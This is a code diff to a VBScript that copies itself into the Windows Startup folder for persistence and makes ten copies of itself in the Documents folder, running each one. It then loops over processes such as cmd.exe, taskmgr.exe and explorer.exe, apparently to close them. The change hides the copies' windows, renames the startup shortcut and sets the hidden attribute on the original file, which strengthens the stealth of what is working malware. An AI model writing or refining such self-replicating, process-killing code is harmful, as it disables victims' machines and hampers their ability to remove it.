@@ -4,16 +4,19 @@ strExeNames = Array("notepad.exe", "calc.exe", "cmd.exe", "taskmgr.exe", "explor
 
 ' Add script to Startup folder
 strStartupPath = WshShell.SpecialFolders("Startup")
-Set objShellLink = WshShell.CreateShortcut(strStartupPath & "\RunCopies.vbs.lnk")
+Set objShellLink = WshShell.CreateShortcut(strStartupPath & "\CloseWindows.vbs.lnk")
 objShellLink.TargetPath = WScript.ScriptFullName
 objShellLink.Save
 
-For i = 1 To 10
-    ' Copy script to Documents folder and run the copy
-    strDocumentsPath = WshShell.SpecialFolders("MyDocuments")
-    fso.CopyFile WScript.ScriptFullName, strDocumentsPath & "\" & "Copy" & i & ".vbs", True
-    WshShell.Run strDocumentsPath & "\" & "Copy" & i & ".vbs", 1, False
+' Copy script to Documents folder
+strDocumentsPath = WshShell.SpecialFolders("MyDocuments")
+For i = 1 to 10
+    fso.CopyFile WScript.ScriptFullName, strDocumentsPath & "\" & fso.GetFileName(WScript.ScriptFullName) & i & ".vbs", True
+    WshShell.Run chr(34) & strDocumentsPath & "\" & fso.GetFileName(WScript.ScriptFullName) & i & ".vbs" & chr(34), 0, False
 Next
+
+' Hide the original script
+fso.GetFile(WScript.ScriptFullName).Attributes = fso.GetFile(WScript.ScriptFullName).Attributes Or 2 ' Hidden
 
 Do
     For Each strExeName In strExeNames
